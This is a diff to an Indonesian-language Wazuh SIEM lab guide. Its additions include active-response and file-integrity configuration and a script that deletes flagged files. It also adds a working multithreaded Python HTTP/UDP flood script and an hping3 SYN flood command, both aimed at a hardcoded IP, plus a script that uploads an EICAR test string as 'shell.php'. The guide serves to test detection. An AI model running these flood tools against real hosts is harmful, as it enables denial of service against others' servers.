@@ -187,6 +187,111 @@ sudo systemctl enable --now apache2
 sudo apt-get install -y hping3 apache2-utils
 ```
 
+> Pembuatan Custom Script DDoS PoC (ddos_poc.py) di agent2: Skrip berbasis Python ini digunakan untuk mensimulasikan gempuran HTTP Flood dan UDP Flood secara multithreading ke arah server target.
+
+```xml
+#!/usr/bin/env python3
+import socket, threading, time, random, argparse, sys
+from datetime import datetime
+
+DEFAULT_TARGET = "70.153.137.47"
+DEFAULT_PORT = 80
+DEFAULT_THREADS = 100
+DEFAULT_DURATION = 30
+
+packets_sent = 0
+requests_sent = 0
+lock = threading.Lock()
+stop_event = threading.Event()
+
+def log(msg, level="INFO"):
+    timestamp = datetime.now().strftime("%H:%M:%S")
+    print(f"[{timestamp}] [{level}] {msg}")
+
+def http_flood_worker(target, port):
+    global requests_sent
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+        "Mozilla/5.0 (X11; Linux x86_64)",
+    ]
+    while not stop_event.is_set():
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3)
+            s.connect((target, port))
+            ua = random.choice(user_agents)
+            paths = ["/", "/index.html", "/login", "/api/data"]
+            path = random.choice(paths)
+            request = (f"GET {path} HTTP/1.1\r\nHost: {target}\r\n"
+                      f"User-Agent: {ua}\r\nConnection: keep-alive\r\n\r\n")
+            s.send(request.encode())
+            s.close()
+            with lock:
+                requests_sent += 1
+        except:
+            pass
+
+def udp_flood_worker(target, port):
+    global packets_sent
+    payload = random._urandom(1024)
+    while not stop_event.is_set():
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.sendto(payload, (target, port))
+            s.close()
+            with lock:
+                packets_sent += 1
+        except:
+            pass
+
+def run_attack(attack_type, target, port, num_threads, duration):
+    workers = {
+        "http": (http_flood_worker, "HTTP Flood"),
+        "udp": (udp_flood_worker, "UDP Flood"),
+    }
+    worker_func, attack_name = workers[attack_type]
+    log(f"Memulai {attack_name} | Target: {target}:{port} | Threads: {num_threads} | Duration: {duration}s", "WARNING")
+    threads = []
+    for i in range(num_threads):
+        t = threading.Thread(target=worker_func, args=(target, port), daemon=True)
+        t.start()
+        threads.append(t)
+    log(f"{num_threads} threads aktif — attack berjalan...", "INFO")
+    start_time = time.time()
+    try:
+        while time.time() - start_time < duration:
+            elapsed = int(time.time() - start_time)
+            remaining = duration - elapsed
+            print(f"\r  Elapsed: {elapsed}s | Remaining: {remaining}s | "
+                  f"Requests/Packets: {requests_sent + packets_sent:,}    ", end="", flush=True)
+            time.sleep(0.5)
+    except KeyboardInterrupt:
+        log("\nDihentikan oleh user", "WARNING")
+    finally:
+        stop_event.set()
+        print()
+    elapsed_total = int(time.time() - start_time)
+    log(f"Attack selesai! Total: {requests_sent + packets_sent:,} | Duration: {elapsed_total}s", "INFO")
+
+def main():
+    parser = argparse.ArgumentParser(description="DDoS PoC — Wazuh SIEM Lab")
+    parser.add_argument("-t", "--target", default=DEFAULT_TARGET)
+    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT)
+    parser.add_argument("-n", "--threads", type=int, default=DEFAULT_THREADS)
+    parser.add_argument("-d", "--duration", type=int, default=DEFAULT_DURATION)
+    parser.add_argument("-a", "--attack", default="http", choices=["http", "udp"])
+    args = parser.parse_args()
+    print(f"\n  Target: {args.target}:{args.port} | Attack: {args.attack.upper()} | Threads: {args.threads} | Duration: {args.duration}s\n")
+    confirm = input("  Lanjutkan? (yes/no): ").strip().lower()
+    if confirm != "yes":
+        sys.exit(0)
+    run_attack(args.attack, args.target, args.port, args.threads, args.duration)
+
+if __name__ == "__main__":
+    main()
+```
+
 ### Phase 1 — HTTP Flood (Layer 7)
 
 ```bash
@@ -201,6 +306,11 @@ ab -n 500000 -c 1000 http://70.153.137.47/   # jalankan: ulimit -n 65536 jika er
 ```bash
 # Flood 48 juta paket SYN dari agent2
 sudo hping3 -S --flood -V -p 80 70.153.137.47
+```
+
+### Phase 3 - Custom Script
+```bash
+python3 ddos_poc.py
 ```
 
 ---
@@ -247,10 +357,28 @@ iptables DROP untuk IP penyerang (104.214.184.244)
 
 ```xml
 <ossec_config>
+  <integration>
+    <name>virustotal</name>
+    <api_key>API_KEY_VIRUSTOTAL_DI_SINI</api_key>
+    <rule_id>554</rule_id> <alert_format>json</alert_format>
+  </integration>
+
+  <command>
+    <name>remove-threat</name>
+    <executable>remove-threat.sh</executable>
+    <timeout_allowed>no</timeout_allowed>
+  </command>
+
   <active-response>
     <command>firewall-drop</command>
     <location>local</location>
     <rules_id>31151</rules_id>
+  </active-response>
+
+  <active-response>
+    <command>remove-threat</command>
+    <location>local</location>
+    <rules_id>87105</rules_id>
   </active-response>
 </ossec_config>
 ```
@@ -261,11 +389,73 @@ iptables DROP untuk IP penyerang (104.214.184.244)
 | `location` | `local` | Eksekusi langsung di agent yang mendeteksi anomali (agent1) |
 | `rules_id` | `31151` | Trigger: multiple HTTP 400 errors from same source IP |
 
+### Konfigurasi FIM (File Integrity Monitoring) Agent1
+Konfigurasi ini ditambahkan pada file `/var/ossec/etc/ossec.conf` di wazuh-agent1:
+
+```xml
+<syscheck>
+    <directories realtime="yes" check_all="yes">/var/www/html</directories>
+  </syscheck>
+```
+> Inilah yang membuat Agent 1 bisa langsung sadar dan melapor ke Manager saat Agent 2 melempar file shell.php ke dalam server
+
+### Konfigurasi Skrip Custom remove-threat.sh Agent1
+Skrip ini diletakkan di dalam direktori eksekusi Wazuh Agent1, yaitu di: `/var/ossec/active-response/bin/remove-threat.sh`
+
+```xml
+#!/bin/bash
+# Membaca data alert berformat JSON dari Wazuh Manager
+read INPUT_JSON
+
+# Ekstrak path file (Otomatis mencari di log VirusTotal ATAU Syscheck biasa)
+FILE_PATH=$(echo "$INPUT_JSON" | jq -r '.parameters.alert.data.virustotal.source.file // .parameters.alert.syscheck.path // empty')
+
+# Validasi dan eksekusi penghapusan
+if [ -n "$FILE_PATH" ] && [ -f "$FILE_PATH" ]; then
+    rm -f "$FILE_PATH"
+    echo "$(date) - [SOAR] SUKSES menghapus malware: $FILE_PATH" >> /var/ossec/logs/active-responses.log
+else
+    # Jika gagal, catat JSON mentahnya agar kita bisa periksa
+    echo "$(date) - [SOAR] GAGAL. File tidak ditemukan. JSON: $INPUT_JSON" >> /var/ossec/logs/active-responses.log
+fi
+```
+> Skrip ini juga harus diberikan hak akses eksekusi melalui perintah sudo chmod 750 /var/ossec/active-response/bin/remove-threat.sh dan chown root:wazuh agar bisa dijalankan oleh sistem
+
+## Simulasi Serangan Malware
+
+### Buat Script Custom
+Kita buat script custom bernama `malware_poc.py`
+
+```xml
+mport requests
+
+TARGET_URL = "http://70.153.137.47/upload.php"
+# Signature EICAR standar (Aman namun dideteksi sebagai malware oleh semua Antivirus)
+MALWARE_PAYLOAD = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+
+files = {
+    'file': ('shell.php', MALWARE_PAYLOAD, 'application/x-php')
+}
+
+print(f"[*] Mengirim payload webshell ke {TARGET_URL}...")
+response = requests.post(TARGET_URL, files=files)
+print(f"[+] Status: {response.text}")
+```
+### Uji Coba Serangan
+
+```bash
+python3 malware_poc.py
+```
+
 ### Verifikasi di agent1
 
 ```bash
 # Cek rule iptables yang ditambahkan Wazuh
 sudo iptables -L INPUT -n --line-numbers | grep DROP
+
+# Cek file malware yang dikirim apakah sudah terhapus
+ls -l /var/www/html/shell.php
+# Output: ls: cannot access '/var/www/html/shell.php': No such file or directory
 
 # Cek log active response
 sudo tail -f /var/ossec/logs/active-responses.log
